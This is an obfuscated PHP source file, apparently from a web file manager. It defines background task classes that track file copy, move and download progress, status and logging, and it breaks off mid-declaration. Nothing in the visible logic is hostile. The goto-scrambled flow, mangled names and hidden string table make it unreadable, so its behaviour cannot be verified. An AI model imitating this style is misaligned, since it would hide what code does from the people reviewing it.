<?php
 goto Dİˆ˜·ñƒ; A˜¶µŞ‚Â…: class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\162\165\x6e\156\x69\x6e\x67"; const STATYS_KILL = "\153\151\x6c\154"; public $task; public function __destruct() { $this->end(); } public function __construct($DÍ¦Á‰ÍãÜ, $f×íÓùå¸° = '', $fÍå‰ÉÎŞŒ = 0, $D©Ä—ÀÊÆ¸ = '') { goto a‰È¸¶İ²ø; D«ôøä“ˆ§: $GLOBALS[$A˜Æà®Š§[1497]] = 1; Hook::bind($A˜Æà®Š§[1454], array($this, $A˜Æà®Š§[1498])); Hook::bind($A˜Æà®Š§[1499], array($this, $A˜Æà®Š§[1500])); goto BñØ«ôæÎÛ; a‰È¸¶İ²ø: $A˜Æà®Š§ =& $_SERVER[¢Í]; if (self::get($DÍ¦Á‰ÍãÜ)) { return; } $this->task = array($A˜Æà®Š§[392] => $DÍ¦Á‰ÍãÜ, $A˜Æà®Š§[1489] => USER_ID, $A˜Æà®Š§[1394] => $D©Ä—ÀÊÆ¸, $A˜Æà®Š§[29] => $f×íÓùå¸°, $A˜Æà®Š§[991] => $A˜Æà®Š§[33], $A˜Æà®Š§[989] => $fÍå‰ÉÎŞŒ, $A˜Æà®Š§[1003] => 0, $A˜Æà®Š§[1490] => 0, $A˜Æà®Š§[1491] => 0, $A˜Æà®Š§[1492] => timeFloat(), $A˜Æà®Š§[1493] => 0, $A˜Æà®Š§[1494] => 0, $A˜Æà®Š§[1495] => 0, $A˜Æà®Š§[1496] => 0, $A˜Æà®Š§[703] => $A˜Æà®Š§[1452]); goto D«ôøä“ˆ§; BñØ«ôæÎÛ: $this->startAfter(); Hook::trigger($A˜Æà®Š§[1501], $this->task); $this->task[$A˜Æà®Š§[1494]] = timeFloat(); goto cèí‚Î“²ê; cèí‚Î“²ê: } public function end() { goto FÉõÆ˜¯æì; bù‚«Û—: $f»›µíø• = timeFloat() - $this->task[$AÃŒÛŒÁºé[1492]]; self::log($AÃŒÛŒÁºé[1502] . $this->task[$AÃŒÛŒÁºé[392]] . $AÃŒÛŒÁºé[1503] . $f»›µíø• . $AÃŒÛŒÁºé[1504]); Hook::unbind($AÃŒÛŒÁºé[1454], array($this, $AÃŒÛŒÁºé[1498])); goto F¢•íƒë¡; FÉõÆ˜¯æì: $AÃŒÛŒÁºé =& $_SERVER[¢Í]; if (!$this->task) { return; } if ($this->task[$AÃŒÛŒÁºé[1494]]) { self::valueSet($this->task[$AÃŒÛŒÁºé[392]], !1); } goto bù‚«Û—; F¢•íƒë¡: Hook::unbind($AÃŒÛŒÁºé[1499], array($this, $AÃŒÛŒÁºé[1500])); $this->endAfter(); $this->task = !1; goto fƒ·Ä»”‹¶; fƒ·Ä»”‹¶: } public function update($b¼âˆÍàíÍ = 0, $fÑâğ¨ó“¸ = false) { goto aÛ‹ñ”ˆÖÏ; EÅĞÑ‰àçå: $this->updateAfter(); $AÒœ¤î‰ïâ = 0.2; if (timeFloat() - $a»’š„Õƒ[$BºãÜåÀ[1494]] < $AÒœ¤î‰ïâ && !$fÑâğ¨ó“¸) { return; } goto fÅ“Ù´Ã”; fÅ“Ù´Ã”: $A›¢˜ Ÿº” = self::get($a»’š„Õƒ[$BºãÜåÀ[392]]); $B°„×ÊĞ§ì = $A›¢˜ Ÿº”[$BºãÜåÀ[703]]; if ($B°„×ÊĞ§ì == self::STATYS_KILL) { $C¸´ç¬½Íí = array($BºãÜåÀ[1505] => LNG($BºãÜåÀ[1506]), $BºãÜåÀ[1053] => !1); Cache::set($BºãÜåÀ[1507] . $this->task[$BºãÜåÀ[392]], $C¸´ç¬½Íí, 30); $this->end(); die; } else { if ($B°„×ÊĞ§ì == self::STATYS_STOP) { $c–•ÉÆâäº = 2; $A›¢˜ Ÿº”[$BºãÜåÀ[1495]] += $c–•ÉÆâäº; self::valueSet($a»’š„Õƒ[$BºãÜåÀ[392]], $A›¢˜ Ÿº”); sleep($c–•ÉÆâäº); $this->update(); return; } } goto Bé¨ÌšİùĞ; aã¦©¬•ƒŒ: Hook::trigger($BºãÜåÀ[1508], $a»’š„Õƒ); self::valueSet($a»’š„Õƒ[$BºãÜåÀ[392]], $a»’š„Õƒ); goto CŠ‘…õØÛ³; BŠŠÖàè§: $a»’š„Õƒ[$BºãÜåÀ[1003]] += $b¼âˆÍàíÍ; $a»’š„Õƒ[$BºãÜåÀ[1493]] = timeFloat(); if ($a»’š„Õƒ[$BºãÜåÀ[989]]) { if ($a»’š„Õƒ[$BºãÜåÀ[989]] < $a»’š„Õƒ[$BºãÜåÀ[1003]]) { $a»’š„Õƒ[$BºãÜåÀ[989]] = $a»’š„Õƒ[$BºãÜåÀ[1003]]; } $c‰¦†æ™…Ë = timeFloat() - $a»’š„Õƒ[$BºãÜåÀ[1492]] - $a»’š„Õƒ[$BºãÜåÀ[1495]]; $a»’š„Õƒ[$BºãÜåÀ[1490]] = $a»’š„Õƒ[$BºãÜåÀ[1003]] / $a»’š„Õƒ[$BºãÜåÀ[989]]; $a»’š„Õƒ[$BºãÜåÀ[1491]] = $a»’š„Õƒ[$BºãÜåÀ[1003]] / $c‰¦†æ™…Ë; if ($a»’š„Õƒ[$BºãÜåÀ[1490]] > 0) { $a»’š„Õƒ[$BºãÜåÀ[1496]] = $c‰¦†æ™…Ë * (1 - $a»’š„Õƒ[$BºãÜåÀ[1490]]) / $a»’š„Õƒ[$BºãÜåÀ[1490]]; } $a»’š„Õƒ[$BºãÜåÀ[1496]] = $a»’š„Õƒ[$BºãÜåÀ[1496]] <= 0 ? 0 : $a»’š„Õƒ[$BºãÜåÀ[1496]]; } goto EÅĞÑ‰àçå; aÛ‹ñ”ˆÖÏ: $BºãÜåÀ =& $_SERVER[¢Í]; $a»’š„Õƒ =& $this->task; if (!$a»’š„Õƒ) { return; } goto BŠŠÖàè§; Bé¨ÌšİùĞ: $a»’š„Õƒ[$BºãÜåÀ[703]] = $B°„×ÊĞ§ì ? $B°„×ÊĞ§ì : $a»’š„Õƒ[$BºãÜåÀ[703]]; $a»’š„Õƒ[$BºãÜåÀ[1495]] = $A›¢˜ Ÿº”[$BºãÜåÀ[1495]] ? $A›¢˜ Ÿº”[$BºãÜåÀ[1495]] : 0; $a»’š„Õƒ[$BºãÜåÀ[1494]] = timeFloat(); goto aã¦©¬•ƒŒ; CŠ‘…õØÛ³: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($E™ì ‚ÎÜˆ) { $c¦§Åé¶å° =& $_SERVER[¢Í]; Cache::set($c¦§Åé¶å°[1507] . $this->task[$c¦§Åé¶å°[392]], $E™ì ‚ÎÜˆ, 60); return $E™ì ‚ÎÜˆ; } public static function get($E†Ë©„ïÄ®) { return self::valueGet($E†Ë©„ïÄ®); } public static function listData() { $a£©ÑÌ¥Ù¸ = self::valueGet(); return array_sort_by($a£©ÑÌ¥Ù¸, $_SERVER[¢Í][1492], !0); } public static function kill($B‡Ğ‘õ”ù¶) { return self::changeStatus($B‡Ğ‘õ”ù¶, self::STATYS_KILL); } public static function stop($Dôæ·£ô¥ƒ) { return self::changeStatus($Dôæ·£ô¥ƒ, self::STATYS_STOP); } public static function restart($e´–š‘„ß) { return self::changeStatus($e´–š‘„ß, self::STATYS_RUNNING); } public static function killAll() { $AôÊîŸ²Á„ =& $_SERVER[¢Í]; $Aæ•ÙÌôŒ¹ = self::listData(); foreach ($Aæ•ÙÌôŒ¹ as $FÂÆçªÇ) { self::kill($FÂÆçªÇ[$AôÊîŸ²Á„[392]]); } sleep(2); foreach ($Aæ•ÙÌôŒ¹ as $FÂÆçªÇ) { self::valueSet($FÂÆçªÇ[$AôÊîŸ²Á„[392]], !1); } } private static function changeStatus($b±ãïõÍÊÃ, $bÎŒè‹ù¯¦) { goto F™é¡¼³Ô–; F™é¡¼³Ô–: $Fß›é±Ÿâœ =& $_SERVER[¢Í]; $døù–Åš¹Ê = self::valueGet($b±ãïõÍÊÃ); if (!$døù–Åš¹Ê) { return !1; } goto cß¡ã«†Ï”; cß¡ã«†Ï”: $døù–Åš¹Ê[$Fß›é±Ÿâœ[703]] = $bÎŒè‹ù¯¦; self::valueSet($b±ãïõÍÊÃ, $døù–Åš¹Ê); self::log($Fß›é±Ÿâœ[1509] . $døù–Åš¹Ê[$Fß›é±Ÿâœ[392]] . $Fß›é±Ÿâœ[1510] . $bÎŒè‹ù¯¦); goto Eª‡ñÍØéÍ; Eª‡ñÍØéÍ: return !0; goto Dó¨ÛİÙ¶÷; Dó¨ÛİÙ¶÷: } public static function valueGet($bØ¦ƒÈ³‚ = false) { $DßÕÜ½±©‹ =& $_SERVER[¢Í]; if ($bØ¦ƒÈ³‚) { $BºóÄñ­ö  = Model($DßÕÜ½±©‹[424])->where(array($DßÕÜ½±©‹[99] => $bØ¦ƒÈ³‚, $DßÕÜ½±©‹[29] => $DßÕÜ½±©‹[1511]))->find(); return $BºóÄñ­ö  ? json_decode($BºóÄñ­ö [$DßÕÜ½±©‹[375]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($câò¤ºÇÚá = false) { goto aÊÁŠÃÜ’; C¿‚ñöîÊ : return $CâÇ›Ú©–¨; goto eÀï±È–©Œ; a±Ø¨Åù«: $CâÇ›Ú©–¨ = Model($Bì‰âíÆâ»[424])->where($dèÆÅã†˜…)->select(); $CâÇ›Ú©–¨ = $CâÇ›Ú©–¨ ? $CâÇ›Ú©–¨ : array(); foreach ($CâÇ›Ú©–¨ as $F»×Èƒˆ» => $a‘£Éîã¥’) { $CâÇ›Ú©–¨[$F»×Èƒˆ»] = json_decode($a‘£Éîã¥’[$Bì‰âíÆâ»[375]], !0); } goto C¿‚ñöîÊ ; aÊÁŠÃÜ’: $Bì‰âíÆâ» =& $_SERVER[¢Í]; $dèÆÅã†˜… = array($Bì‰âíÆâ»[29] => $Bì‰âíÆâ»[1511]); if ($câò¤ºÇÚá) { $dèÆÅã†˜…[$Bì‰âíÆâ»[1489]] = $câò¤ºÇÚá; } goto a±Ø¨Åù«; eÀï±È–©Œ: } public static function valueSet($Aò·ªäŒ·Å, $e¤©Â´•âö) { goto A‰‚öš£„µ; A‰‚öš£„µ: $C‡ƒ¥Õø¹ =& $_SERVER[¢Í]; if (!$e¤©Â´•âö) { return Model($C‡ƒ¥Õø¹[424])->where(array($C‡ƒ¥Õø¹[99] => $Aò·ªäŒ·Å, $C‡ƒ¥Õø¹[29] => $C‡ƒ¥Õø¹[1511]))->delete(); } $F‘³¡‹Ö¨ = json_encode($e¤©Â´•âö); goto Eµ­³“íñù; Eµ­³“íñù: if (!$F‘³¡‹Ö¨) { ob_start(); var_dump($e¤©Â´•âö); $A¥‰ã·œí = ob_get_clean(); self::log($C‡ƒ¥Õø¹[1512] . json_encode_force($A¥‰ã·œí)); } if (!$Aò·ªäŒ·Å || !$e¤©Â´•âö[$C‡ƒ¥Õø¹[392]]) { return !1; } $d¹Åã ®ÑÒ = array($C‡ƒ¥Õø¹[29] => $C‡ƒ¥Õø¹[1511], $C‡ƒ¥Õø¹[1489] => USER_ID, $C‡ƒ¥Õø¹[99] => $Aò·ªäŒ·Å, $C‡ƒ¥Õø¹[375] => $F‘³¡‹Ö¨); goto EòÉãÆ°Âù; EòÉãÆ°Âù: Model($C‡ƒ¥Õø¹[424])->add($d¹Åã ®ÑÒ, array(), !0); goto CÔºîò‹†Ò; CÔºîò‹†Ò: } public static function log($bƒÄÇÙ‘À›) { write_log($bƒÄÇÙ‘À›, $_SERVER[¢Í][1513]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto FÕ×µ‹áÍÓ; CáÈîŠ›Â: $E´Ãä±¯Ş“[$c‘íÓ‰¨·[991]] = $c‘íÓ‰¨·[33]; $E´Ãä±¯Ş“[$c‘íÓ‰¨·[1536]] = $c‘íÓ‰¨·[33]; $E´Ãä±¯Ş“[$c‘íÓ‰¨·[1537]] = 0; goto C‰¨³´ã£æ; FÕ×µ‹áÍÓ: $c‘íÓ‰¨· =& $_SERVER[¢Í]; $E´Ãä±¯Ş“ =& $this->task; $this->sourceCopyFolder = !1; goto BßİËÍğ“”; dÛ¹á¤©…¡: Hook::bind($c‘íÓ‰¨·[568], array($this, $c‘íÓ‰¨·[1521])); Hook::bind($c‘íÓ‰¨·[535], array($this, $c‘íÓ‰¨·[1522])); Hook::bind($c‘íÓ‰¨·[532], array($this, $c‘íÓ‰¨·[1522])); goto a¾˜÷æˆÒ©; c®Å‰î‹©Â: $E´Ãä±¯Ş“[$c‘íÓ‰¨·[1532]] = LNG($c‘íÓ‰¨·[1533]); $E´Ãä±¯Ş“[$c‘íÓ‰¨·[1534]] = 0; $E´Ãä±¯Ş“[$c‘íÓ‰¨·[1535]] = 0; goto CáÈîŠ›Â; BßİËÍğ“”: Hook::bind($c‘íÓ‰¨·[1514], array($this, $c‘íÓ‰¨·[1515])); Hook::bind($c‘íÓ‰¨·[1075], array($this, $c‘íÓ‰¨·[1516])); Hook::bind($c‘íÓ‰¨·[1517], array($this, $c‘íÓ‰¨·[1518])); goto e–ªˆ‚´Ó; e–ªˆ‚´Ó: Hook::bind($c‘íÓ‰¨·[564], array($this, $c‘íÓ‰¨·[1519])); Hook::bind($c‘íÓ‰¨·[565], array($this, $c‘íÓ‰¨·[1520])); Hook::bind($c‘íÓ‰¨·[567], array($this, $c‘íÓ‰¨·[1521])); goto dÛ¹á¤©…¡; a¾˜÷æˆÒ©: Hook::bind($c‘íÓ‰¨·[537], array($this, $c‘íÓ‰¨·[1522])); Hook::bind($c‘íÓ‰¨·[539], array($this, $c‘íÓ‰¨·[1522])); Hook::bind($c‘íÓ‰¨·[541], array($this, $c‘íÓ‰¨·[1522])); goto d×™¯¸‡Õ´; cÑ…÷Ú™„: Hook::bind($c‘íÓ‰¨·[1526], array($this, $c‘íÓ‰¨·[1527])); Hook::bind($c‘íÓ‰¨·[1528], array($this, $c‘íÓ‰¨·[1529])); Hook::bind($c‘íÓ‰¨·[1530], array($this, $c‘íÓ‰¨·[1531])); goto c®Å‰î‹©Â; d×™¯¸‡Õ´: Hook::bind($c‘íÓ‰¨·[1523], array($this, $c‘íÓ‰¨·[1524])); Hook::bind($c‘íÓ‰¨·[557], array($this, $c‘íÓ‰¨·[1525])); $this->sourceModelCopyFlag = !1; goto cÑ…÷Ú™„; C‰¨³´ã£æ: $E´Ãä±¯Ş“[$c‘íÓ‰¨·[1538]] = 0; $E´Ãä±¯Ş“[$c‘íÓ‰¨·[1539]] = 0; if (!$E´Ãä±¯Ş“[$c‘íÓ‰¨·[1394]]) { $E´Ãä±¯Ş“[$c‘íÓ‰¨·[1394]] = LNG($c‘íÓ‰¨·[1540]); } goto BğÊêô×ß; BğÊêô×ß: } protected function endAfter() { goto a¿¥ˆ½™´æ; A£–“‹“øÙ: Hook::unbind($f†Ûª¨–™³[541], array($this, $f†Ûª¨–™³[1522])); Hook::unbind($f†Ûª¨–™³[1523], array($this, $f†Ûª¨–™³[1524])); Hook::unbind($f†Ûª¨–™³[557], array($this, $f†Ûª¨–™³[1525])); goto F«´Â˜”‹à; AïÔ‘¶ô§: Hook::unbind($f†Ûª¨–™³[567], array($this, $f†Ûª¨–™³[1521])); Hook::unbind($f†Ûª¨–™³[568], array($this, $f†Ûª¨–™³[1521])); Hook::unbind($f†Ûª¨–™³[535], array($this, $f†Ûª¨–™³[1522])); goto fØôºË¦œ; a¿¥ˆ½™´æ: $f†Ûª¨–™³ =& $_SERVER[¢Í]; Hook::unbind($f†Ûª¨–™³[1514], array($this, $f†Ûª¨–™³[1515])); Hook::unbind($f†Ûª¨–™³[1075], array($this, $f†Ûª¨–™³[1516])); goto f„§¦­õè×; f„§¦­õè×: Hook::unbind($f†Ûª¨–™³[1517], array($this, $f†Ûª¨–™³[1518])); Hook::unbind($f†Ûª¨–™³[564], array($this, $f†Ûª¨–™³[1519])); Hook::unbind($f†Ûª¨–™³[565], array($this, $f†Ûª¨–™³[1520])); goto AïÔ‘¶ô§; fØôºË¦œ: Hook::unbind($f†Ûª¨–™³[532], array($this, $f†Ûª¨–™³[1522])); Hook::unbind($f†Ûª¨–™³[537], array($this, $f†Ûª¨–™³[1522])); Hook::unbind($f†Ûª¨–™³[539], array($this, $f†Ûª¨–™³[1522])); goto A£–“‹“øÙ; F«´Â˜”‹à: Hook::unbind($f†Ûª¨–™³[1526], array($this, $f†Ûª¨–™³[1527])); Hook::unbind($f†Ûª¨–™³[1528], array($this, $f†Ûª¨–™³[1529])); Hook::unbind($f†Ûª¨–™³[1530], array($this, $f†Ûª¨–™³[1531])); goto C¬Š¡®ğä‰; C¬Š¡®ğä‰: } public function copyMoveStart($cÅ¹¶öòˆ, $bŠõºÍ¥Ë¾, $d‡”Šª³À, $B†Ğ‰ÒâÃŒ) { goto eå†¬òÇŒ‘; DĞ¨ó‚ÕÅ: if (substr($bŠõºÍ¥Ë¾, 0, strlen($a¾ ÍğÔ­)) == $a¾ ÍğÔ­) { return; } if (substr($B†Ğ‰ÒâÃŒ, 0, strlen($a¾ ÍğÔ­)) == $a¾ ÍğÔ­) { return; } $C‡•§»Ğ‰« =& $this->task; goto c½ğ†…Ş ; eå†¬òÇŒ‘: $F“†¡‚²¤ =& $_SERVER[¢Í]; self::log($F“†¡‚²¤[1541] . $bŠõºÍ¥Ë¾ . $F“†¡‚²¤[76] . $B†Ğ‰ÒâÃŒ); $a¾ ÍğÔ­ = rtrim(TEMP_FILES, $F“†¡‚²¤[8]); goto DĞ¨ó‚ÕÅ; c½ğ†…Ş : $C‡•§»Ğ‰«[$F“†¡‚²¤[1542]] = KodIO::transferType($cÅ¹¶öòˆ, $d‡”Šª³À); $this->update(); goto e…šÉ¤ŒâŒ; e…šÉ¤ŒâŒ: } public function updateAfter() { goto FÖÄ«³ŒóĞ; AØÑÚšé§®: if ($this->sourceModelCopyFlag) { return; } if ($A‚íè†ğéŒ[$cè‰õİñ·²[1542]] == $cè‰õİñ·²[1146]) { return; } if ($A‚íè†ğéŒ[$cè‰õİñ·²[1542]] == $cè‰õİñ·²[1061] || $A‚íè†ğéŒ[$cè‰õİñ·²[1542]] == $cè‰õİñ·²[113]) { if ($A‚íè†ğéŒ[$cè‰õİñ·²[1536]]) { $A‚íè†ğéŒ[$cè‰õİñ·²[1539]] = $A‚íè†ğéŒ[$cè‰õİñ·²[1538]] + $A‚íè†ğéŒ[$cè‰õİñ·²[1535]]; } } else { if ($A‚íè†ğéŒ[$cè‰õİñ·²[1542]] == $cè‰õİñ·²[1147]) { if ($A‚íè†ğéŒ[$cè‰õİñ·²[1536]] == $cè‰õİñ·²[1061]) { $A‚íè†ğéŒ[$cè‰õİñ·²[1539]] = $A‚íè†ğéŒ[$cè‰õİñ·²[1538]] + $A‚íè†ğéŒ[$cè‰õİñ·²[1535]] * 0.5; } else { if ($A‚íè†ğéŒ[$cè‰õİñ·²[1536]] == $cè‰õİñ·²[113]) { $A‚íè†ğéŒ[$cè‰õİñ·²[1539]] = $A‚íè†ğéŒ[$cè‰õİñ·²[1538]] + $A‚íè†ğéŒ[$cè‰õİñ·²[1534]] * 0.5 + $A‚íè†ğéŒ[$cè‰õİñ·²[1535]] * 0.5; } } } } goto CİïÄ¤‰èß; FÖÄ«³ŒóĞ: $cè‰õİñ·² =& $_SERVER[¢Í]; $A‚íè†ğéŒ =& $this->task; if (!$A‚íè†ğéŒ[$cè‰õİñ·²[712]]) { return; } goto AØÑÚšé§®; CİïÄ¤‰èß: $A‚íè†ğéŒ[$cè‰õİñ·²[1490]] = $A‚íè†ğéŒ[$cè‰õİñ·²[1539]] / $A‚íè†ğéŒ[$cè‰õİñ·²[712]]; if ($A‚íè†ğéŒ[$cè‰õİñ·²[1490]] > 0) { $aÔÕÖäÚ°é = timeFloat() - $A‚íè†ğéŒ[$cè‰õİñ·²[1492]] - $A‚íè†ğéŒ[$cè‰õİñ·²[1495]]; $A‚íè†ğéŒ[$cè‰õİñ·²[1496]] = $aÔÕÖäÚ°é * (1 - $A‚íè†ğéŒ[$cè‰õİñ·²[1490]]) / $A‚íè†ğéŒ[$cè‰õİñ·²[1490]]; } goto bŸº´È£Û¥; bŸº´È£Û¥: } public function addPath($cÄÙÊ­¬õˆ) { goto fµÚÉ‘ì¦å; dâÆ÷ÀœÂ©: if ($DÂâèèŞ½º[$DÅïé§Õ»[29]] == $DÅïé§Õ»[181]) { $D³ŞÁæÊ†[$DÅïé§Õ»[989]] += 1; } else { $D³ŞÁæÊ†[$DÅïé§Õ»[989]] += $DÂâèèŞ½º[$DÅïé§Õ»[90]][$DÅïé§Õ»[88]]; if ($DÂâèèŞ½º[$DÅïé§Õ»[394]]) { $D³ŞÁæÊ†[$DÅïé§Õ»[989]] += $DÂâèèŞ½º[$DÅïé§Õ»[90]][$DÅïé§Õ»[89]] + 1; } } $D³ŞÁæÊ†[$DÅïé§Õ»[712]] += $DÂâèèŞ½º[$DÅïé§Õ»[87]]; $this->update(); goto A§ˆ ¸Å–»; f…î òÍÕ·: $DÂâèèŞ½º = IO::infoWithChildren($cÄÙÊ­¬õˆ); $c“˜£”ÈÄÆ = $D³ŞÁæÊ†[$DÅïé§Õ»[1543]] ? $D³ŞÁæÊ†[$DÅïé§Õ»[1543]][$DÅïé§Õ»[1544]] : 0; $D³ŞÁæÊ†[$DÅïé§Õ»[1543]] = array($DÅïé§Õ»[1544] => $c“˜£”ÈÄÆ + 1, $DÅïé§Õ»[411] => $DÂâèèŞ½º[$DÅïé§Õ»[28]], $DÅïé§Õ»[85] => $DÂâèèŞ½º[$DÅïé§Õ»[85]], $DÅïé§Õ»[492] => $DÂâèèŞ½º[$DÅïé§Õ»[492]] ? $DÂâèèŞ½º[$DÅïé§Õ»[492]] : $DÂâèèŞ½º[$DÅïé§Õ»[85]]); goto dâÆ÷ÀœÂ©; fµÚÉ‘ì¦å: $DÅïé§Õ» =& $_SERVER[¢Í]; if (!$cÄÙÊ­¬õˆ) { return; } $D³ŞÁæÊ† =& $this->task; goto f…î òÍÕ·; A§ˆ ¸Å–»: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($dí½ö¸Õ™§) { $e—´„ùÍ—è =& $_SERVER[¢Í]; $CôµĞù£¹ =& $this->task; $CôµĞù£¹[$e—´„ùÍ—è[1532]] = $dí½ö¸Õ™§[$e—´„ùÍ—è[28]]; $CôµĞù£¹[$e—´„ùÍ—è[991]] = $dí½ö¸Õ™§[$e—´„ùÍ—è[28]]; $this->update(); } public function copyFileStart($B¡è‘Å³ŞÂ, $eÉÁïë˜ä, $A¼‰ Šà„, $A²ßğ”Ûİ, $C™Òâàä§­, $EŒ®Ëõäù–) { goto DÓ¶â–­ã; a§ÕšÌÇÉÔ: $F¢¿à¢–ô[$f ÏéÎØÆó[991]] = $f ÏéÎØÆó[33]; $F¢¿à¢–ô[$f ÏéÎØÆó[1536]] = $f ÏéÎØÆó[33]; $F¢¿à¢–ô[$f ÏéÎØÆó[1537]] = 0; goto F«Ñ¹ÌÙš; cƒ›ñ‹¹ÙÜ: $GLOBALS[$f ÏéÎØÆó[1546]] = $C™Òâàä§­; $GLOBALS[$f ÏéÎØÆó[1545]] = $EŒ®Ëõäù–; $F¢¿à¢–ô =& $this->task; goto fñÓ¼¦±ƒ›; fñÓ¼¦±ƒ›: $F¢¿à¢–ô[$f ÏéÎØÆó[1532]] = $AÏÉÓ©™Í¾; $F¢¿à¢–ô[$f ÏéÎØÆó[1534]] = (int) $B¡è‘Å³ŞÂ->size($eÉÁïë˜ä); $F¢¿à¢–ô[$f ÏéÎØÆó[1535]] = 0; goto a§ÕšÌÇÉÔ; DÓ¶â–­ã: $f ÏéÎØÆó =& $_SERVER[¢Í]; $AÏÉÓ©™Í¾ = $C™Òâàä§­; if ($AÏÉÓ©™Í¾ == $GLOBALS[$f ÏéÎØÆó[1545]]) { $AÏÉÓ©™Í¾ = $GLOBALS[$f ÏéÎØÆó[1546]]; } goto cƒ›ñ‹¹ÙÜ; F«Ñ¹ÌÙš: $this->update(); goto d‘œÂ×Åïš; d‘œÂ×Åïš: } public function copyFileEnd($d†¦“Ô¤œ«, $fÃ»ò¯Ÿ©Ò, $cëäìÁÃ, $A°°ÙÒƒ©, $DÃ¼·óêã, $d’ƒ›´¸‘ì) { $fÕˆğ•ƒ =& $_SERVER[¢Í]; $C••š¥ƒ™Í =& $this->task; $C••š¥ƒ™Í[$fÕˆğ•ƒ[1535]] = $C••š¥ƒ™Í[$fÕˆğ•ƒ[1534]]; $C••š¥ƒ™Í[$fÕˆğ•ƒ[1536]] = $fÕˆğ•ƒ[33]; if ($DÃ¼·óêã == $C••š¥ƒ™Í[$fÕˆğ•ƒ[1532]]) { $C••š¥ƒ™Í[$fÕˆğ•ƒ[1538]] += $C••š¥ƒ™Í[$fÕˆğ•ƒ[1534]]; $C••š¥ƒ™Í[$fÕˆğ•ƒ[1539]] = $C••š¥ƒ™Í[$fÕˆğ•ƒ[1538]]; $this->update(1); } else { $this->update(); $C••š¥ƒ™Í[$fÕˆğ•ƒ[1535]] = 0; } self::log($fÕˆğ•ƒ[1547] . $fÃ»ò¯Ÿ©Ò . $fÕˆğ•ƒ[76] . $A°°ÙÒƒ© . $fÕˆğ•ƒ[56] . $DÃ¼·óêã . $fÕˆğ•ƒ[1548] . $C••š¥ƒ™Í[$fÕˆğ•ƒ[1532]]); } public function updateFileEnd($BÒÔ©ÁÏİî, $AÊ£Ù ÆË¹) { goto C¿í¢ÙÊ¡Œ; C¿í¢ÙÊ¡Œ: $CŠ»Õªìå¹ =& $_SERVER[¢Í]; $CÑäšÃˆƒ =& $this->task; $CÑäšÃˆƒ[$CŠ»Õªìå¹[1532]] = $BÒÔ©ÁÏİî; goto B–¹ÏŞôç; B–¹ÏŞôç: $CÑäšÃˆƒ[$CŠ»Õªìå¹[1534]] = $AÊ£Ù ÆË¹; $CÑäšÃˆƒ[$CŠ»Õªìå¹[1538]] += $AÊ£Ù ÆË¹; $CÑäšÃˆƒ[$CŠ»Õªìå¹[1539]] = $CÑäšÃˆƒ[$CŠ»Õªìå¹[1538]]; goto aá²Õõó×­; aá²Õõó×­: $this->update(1); self::log($CŠ»Õªìå¹[1549] . $BÒÔ©ÁÏİî); goto dŒ×å‡‰ ; dŒ×å‡‰ : } public function sourceModelCopy($AŞ Ö¿§¡…) { goto a•¸ÕĞ¤‚ê; b»ÛÌğãÉ‹: switch ($EÎØËÓÇã”) { case $BÁÊòñä—[533]: $féÈ·“ã‘› = 1; break; case $BÁÊòñä—[536]: $b–È«„·ã[$BÁÊòñä—[1532]] = $d–äŠÀñáº[$BÁÊòñä—[28]]; break; case $BÁÊòñä—[538]: $féÈ·“ã‘› = intval($AŞ Ö¿§¡…[$BÁÊòñä—[379]] * 0.4); break; case $BÁÊòñä—[540]: $féÈ·“ã‘› = intval($AŞ Ö¿§¡…[$BÁÊòñä—[379]] * 0.2); break; case $BÁÊòñä—[542]: $féÈ·“ã‘› = intval($AŞ Ö¿§¡…[$BÁÊòñä—[379]] * 0.4); break; } $this->update($féÈ·“ã‘›); $this->sourceModelCopyFlag = !1; goto cÕÆêÒ¦É¡; a•¸ÕĞ¤‚ê: $BÁÊòñä— =& $_SERVER[¢Í]; $EÎØËÓÇã” = $AŞ Ö¿§¡…[0]; $d–äŠÀñáº = $AŞ Ö¿§¡…[1]; goto Fåï°†í–ä; Fåï°†í–ä: $b–È«„·ã =& $this->task; $this->sourceModelCopyFlag = !0; $féÈ·“ã‘› = 0; goto b»ÛÌğãÉ‹; cÕÆêÒ¦É¡: } public function sourceRemove($D»·åÉ¶Ş½, $BÉ”²¯ª’¾) { $AÛ˜«˜×Ú =& $_SERVER[¢Í]; $this->sourceModelCopyFlag = !0; $fí²Ï³İ¦¾ = 1; if (isset($D»·åÉ¶Ş½[$AÛ˜«˜×Ú[90]])) { $fí²Ï³İ¦¾ = $D»·åÉ¶Ş½[$AÛ˜«˜×Ú[90]][$AÛ˜«˜×Ú[88]] + $D»·åÉ¶Ş½[$AÛ˜«˜×Ú[90]][$AÛ˜«˜×Ú[89]] + 1; } $this->update($fí²Ï³İ¦¾); $this->sourceModelCopyFlag = !1; } public function sourceMove($c‹’‰ã´Ô–) { $this->sourceRemove($c‹’‰ã´Ô–, !1); } public function curlProgress($DÁš†…ì™, $eŠ‚™¸Ì¦, $f‹Ş¶»œï´, $EÓ†Ö–Î×˜, $f„ğö¤×) { $EŒŒÄÎóçå =& $_SERVER[¢Í]; $dÛ®Áõšƒ =& $this->task; if ($f„ğö¤× > 0) { $dÛ®Áõšƒ[$EŒŒÄÎóçå[991]] = $EŒŒÄÎóçå[1550]; $dÛ®Áõšƒ[$EŒŒÄÎóçå[1536]] = $EŒŒÄÎóçå[113]; if ($dÛ®Áõšƒ[$EŒŒÄÎóçå[1534]]) { $dÛ®Áõšƒ[$EŒŒÄÎóçå[1535]] = $f„ğö¤×; } if ($dÛ®Áõšƒ[$EŒŒÄÎóçå[1537]]) { $dÛ®Áõšƒ[$EŒŒÄÎóçå[1535]] = $f„ğö¤× + $dÛ®Áõšƒ[$EŒŒÄÎóçå[1537]]; } } else { if ($f‹Ş¶»œï´ > 0) { if ($dÛ®Áõšƒ[$EŒŒÄÎóçå[1534]] == $eŠ‚™¸Ì¦) { $dÛ®Áõšƒ[$EŒŒÄÎóçå[1535]] = $f‹Ş¶»œï´; $dÛ®Áõšƒ[$EŒŒÄÎóçå[991]] = $EŒŒÄÎóçå[1551]; $dÛ®Áõšƒ[$EŒŒÄÎóçå[1536]] = $EŒŒÄÎóçå[1061]; } } } $this->update(); } public function curlProgressStart($fÚ¯×Îé¿ò) { } public 